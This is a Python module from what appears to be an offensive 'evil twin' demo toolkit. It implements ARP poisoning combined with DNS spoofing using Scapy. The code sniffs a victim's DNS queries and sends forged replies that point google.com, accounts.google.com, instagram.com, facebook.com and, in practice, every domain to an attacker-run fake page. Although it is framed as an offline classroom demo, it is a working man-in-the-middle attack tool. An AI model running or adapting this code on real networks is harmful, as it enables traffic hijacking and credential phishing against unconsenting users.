"""
Phase 4 — DNS spoofing.

Strategy (fully offline-friendly):
  1. ARP-poison the victim so its DNS queries reach US.
  2. Sniff UDP/53 queries with Scapy.
  3. For every A/AAAA query of a domain in our SPOOF_LIST, craft a forged
     DNS reply that points at the attacker's IP (running fake_server).
  4. Forward everything else untouched (kernel routing handles it because
     we enabled ip_forward in the MITM module).

This combination is what makes the demo so visual — the victim opens
"google.com" on the phone and lands on our fake page, *with no internet*.
"""

import time
import threading
from typing import Optional

from .utils import COLORS, info, ok, warn, err
from . import mitm

try:
    from scapy.all import (  # type: ignore
        IP, UDP, DNS, DNSRR, sniff, send,
    )
    SCAPY_OK = True
except Exception as e:                     # pragma: no cover
    SCAPY_OK = False
    _SCAPY_ERR = str(e)


# Domains we redirect to the attacker. Anything not on this list passes
# through normally (well, it would, if there were internet — in the lab
# they just time out, which is itself part of the lesson).
SPOOF_LIST = [
    "google.com",
    "www.google.com",
    "accounts.google.com",
    "instagram.com",
    "www.instagram.com",
    "facebook.com",
    "www.facebook.com",
    "captive.apple.com",
    "connectivitycheck.gstatic.com",
    "connectivitycheck.android.com",
    "clients3.google.com",
    "www.gstatic.com",
    "wifi.local",
    "login.local",
    "portal.local",
]


_STATE = {
    "running":      False,
    "stop_event":   None,
    "spoofed":      0,
}


def _matches(qname: str) -> bool:
    qname = qname.lower().rstrip(".")
    for d in SPOOF_LIST:
        if qname == d or qname.endswith("." + d):
            return True
    # Be aggressive in the lab: spoof EVERYTHING, since there's no internet.
    # This is what makes a real evil twin so devastating.
    return True


def _spoof_handler(attacker_ip: str, victim_ip: str, events: list):
    def handle(pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(IP)):
            return
        if pkt[IP].src != victim_ip:
            return
        try:
            qname = pkt[DNS].qd.qname.decode(errors="ignore").rstrip(".")
        except Exception:
            return
        if not _matches(qname):
            return

        # Forge an answer with our IP
        try:
            forged = (
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                DNS(
                    id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10,
                             rdata=attacker_ip),
                )
            )
            send(forged, verbose=0)
            _STATE["spoofed"] += 1
            line = f"SPOOFED  {qname}  →  {attacker_ip}"
            events.append(line)
            print(f"  {COLORS['err']}🎭 {line}{COLORS['end']}")
        except Exception as e:
            err(f"forge error: {e}")
    return handle


def run(victim_ip: str, gateway_ip: str, iface: str,
        attacker_ip: Optional[str], duration_sec: int = 90) -> list[str]:
    """
    Run a combined ARP poisoning + DNS spoofing session.
    Returns a list of human-readable events for the report.
    """
    if not SCAPY_OK:
        err(f"Scapy is required. Import error: {_SCAPY_ERR}")
        return []
    if not attacker_ip:
        err("Could not determine attacker IP. Aborting.")
        return []

    events: list[str] = []

    # Step 1: get ARP poisoning running in the background
    info("Starting ARP poisoning to put us between victim and gateway...")
    victim_mac  = mitm._resolve_mac(victim_ip,  iface)
    gateway_mac = mitm._resolve_mac(gateway_ip, iface)
    if not victim_mac or not gateway_mac:
        err("ARP resolution failed; cannot DNS-spoof.")
        return events

    original_forward = mitm._read_ip_forward()
    mitm._write_ip_forward("1")

    mitm._STATE.update({
        "running": True,
        "stop_event": threading.Event(),
        "victim_ip": victim_ip, "victim_mac": victim_mac,
        "gateway_ip": gateway_ip, "gateway_mac": gateway_mac,
        "iface": iface, "original_forward": original_forward,
        "packets_seen": 0,
    })
    poison_t = threading.Thread(
        target=mitm._poison_loop, args=(mitm._STATE["stop_event"],), daemon=True,
    )
    poison_t.start()

    # Step 2: sniff DNS queries from the victim and spoof them
    print()
    ok(f"⚡ DNS-spoofing active. Open the victim phone's browser now ⚡")
    print(f"   Suggested test URLs on the phone (no http://!):")
    print(f"     • {COLORS['info']}google.com{COLORS['end']}")
    print(f"     • {COLORS['info']}instagram.com{COLORS['end']}")
    print(f"     • {COLORS['info']}wifi.local{COLORS['end']}")
    print(f"{COLORS['dim']}(Ctrl-C to stop early; cleanup is automatic){COLORS['end']}\n")

    _STATE["running"] = True
    _STATE["stop_event"] = threading.Event()
    bpf = f"udp port 53 and host {victim_ip}"
    try:
        sniff(
            iface=iface,
            filter=bpf,
            prn=_spoof_handler(attacker_ip, victim_ip, events),
            store=False,
            stop_filter=lambda *_: _STATE["stop_event"].is_set(),
            timeout=duration_sec,
        )
    except KeyboardInterrupt:
        warn("Stopping DNS spoof at user request...")
    finally:
        # Clean up ARP poisoner
        mitm._STATE["stop_event"].set()
        poison_t.join(timeout=3)
        info("Restoring ARP tables ...")
        mitm._restore_arp()
        mitm._write_ip_forward(original_forward)
        mitm._STATE["running"] = False
        _STATE["running"] = False
        ok(f"Done. DNS replies forged: {_STATE['spoofed']}")

    events.append(f"Total DNS replies forged: {_STATE['spoofed']}")
    return events
